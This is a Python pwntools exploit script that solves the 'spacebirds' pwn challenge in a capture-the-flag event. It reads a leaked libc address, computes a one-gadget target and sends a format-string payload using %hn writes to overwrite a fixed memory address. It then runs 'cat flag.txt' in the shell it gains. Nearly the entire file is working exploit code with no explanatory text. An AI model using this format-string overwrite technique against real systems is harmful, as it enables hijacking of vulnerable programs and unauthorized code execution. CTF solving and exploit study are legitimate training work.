#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=spaceheroes-pwn-spacebirds.chals.io' --port 443 spacebirds_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('spacebirds_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'spaceheroes-pwn-spacebirds.chals.io'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return remote("spaceheroes-pwn-spacebirds.chals.io", 443, ssl=True, sni="spaceheroes-pwn-spacebirds.chals.io")

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0400a34
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

i = 0

while(1):
    i += 1
    print(i)
    io = start()
    # sleep(1)
    io.recvuntil(b"Code: ")
    rand_libc =int(io.recv(14).decode(), 16)
    # print(rand_libc)

    onegadget = rand_libc + 638449
    # onegadget = 0x7fba6b510b01
    # print(hex(onegadget))

    lsb = int(hex(onegadget)[-4:], 16)
    # print(hex(lsb))

    nsb = int(hex(onegadget)[-8:-4], 16)
    # print(hex(nsb))

    msb = int(hex(onegadget)[-12:-8], 16)
    # print(hex(msb))

    # 40 caratteri con 13 cifre
    payload = f"AAA%{lsb-3}x%11$hn%{nsb-lsb}x%12$hn%{msb-nsb}x%13$hn".encode() + p64(0x602020) + p64(0x602020 + 2) + p64(0x602020 + 4)
    # print(payload.decode())

    if(len(payload) == 64 and lsb<nsb and nsb<msb and msb>lsb+nsb):
        # print(hex(onegadget))
        # io.interactive()
        io.sendlineafter(b">>>", payload.ljust(108, b"A"))
        io.sendline(b"cat flag.txt")
        io.interactive()

    io.close()  


